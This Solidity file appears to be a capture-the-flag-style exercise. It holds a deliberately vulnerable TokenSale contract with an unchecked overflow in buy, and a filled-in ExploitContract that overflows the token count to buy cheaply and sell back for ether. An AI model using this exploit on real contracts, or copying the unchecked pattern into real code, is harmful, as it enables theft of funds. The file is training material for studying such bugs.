// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";

contract TokenSale {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    constructor() payable {
        require(msg.value == 1 ether, "Requires 1 ether to deploy contract");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable returns (uint256) {
        uint256 total = 0;
        unchecked {
            total += numTokens * PRICE_PER_TOKEN;
        }
        console.log("total: ",total);
        require(msg.value == total, "wrong amount");

        balanceOf[msg.sender] += numTokens;
        return (total);
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        (bool ok, ) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
        require(ok, "Transfer to msg.sender failed");
    }
}

// Write your exploit contract below
contract ExploitContract {
    TokenSale public tokenSale;

    constructor(TokenSale _tokenSale) {
        tokenSale = _tokenSale;
    }

    function buy() public payable {
        uint256 numTokens;
        unchecked {
            numTokens = (type(uint256).max / (1 ether)) + 1;
        }
        tokenSale.buy{value: 415992086870360064}(numTokens);
    }

    function sell() public payable {
        tokenSale.sell(1);
    }

    receive() external payable {}
    // write your exploit functions below
}
